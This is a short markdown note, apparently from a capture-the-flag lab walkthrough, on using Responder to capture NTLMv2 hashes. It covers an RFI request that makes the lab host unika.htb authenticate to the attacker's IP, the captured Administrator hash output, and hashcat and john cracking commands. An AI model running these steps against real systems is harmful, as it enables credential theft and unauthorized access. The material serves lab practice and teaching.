## Responder
https://github.com/SpiderLabs/Responder
https://warroom.rsmus.com/how-to-perform-ntlm-relay/

### Running the tool
```
# -I specifies interface that we want to listen on
# list interfaces with `ip a`
sudo responder -I tun0 -w -d
```
Now that responder is listening, we need to force the victim machine to initiate connection.
In this case there was a webserver vulnerable to RFI (Remote File Injection)
```
<KALI_IP> must be the IP of the interface that responder is listening on
http://unika.htb/index.php?page=//<KALI_IP>/whatewer
```

If everything works out responder should dump the hash
```
[+] Listening for events...                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:ee768715c95fbded:4E9DA4E4915CC88B795E101D5B638A1A:010100000000000000A5634DBCA6DB01423F3AF8456986D60000000002000800570034005100350001001E00570049004E002D0043005600480039003200450044004F0038003200360004003400570049004E002D0043005600480039003200450044004F003800320036002E0057003400510035002E004C004F00430041004C000300140057003400510035002E004C004F00430041004C000500140057003400510035002E004C004F00430041004C000700080000A5634DBCA6DB010600040002000000080030003000000000000000010000000020000087CD20C0B4F67377F5FC83338857E38F1C5F07C772066EFB6F5586FD3A3CF5830A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310038000000000000000000   
```

This is an NTLMv2 hash, so it needs to be cracked. It **cannot** be used in pass-the-hash attack.

### Cracking NTLMv2
```
# wordlist
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# hashcat
hashcat -m 5600 -a 0 -w 3 NTLM2.hash /usr/share/wordlists/rockyou.txt
hashcat -m 5600 -a 0 -w 3 NTLMv2.hash /usr/share/wordlists/rockyou.txt --show

# john
john NTLMv2.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
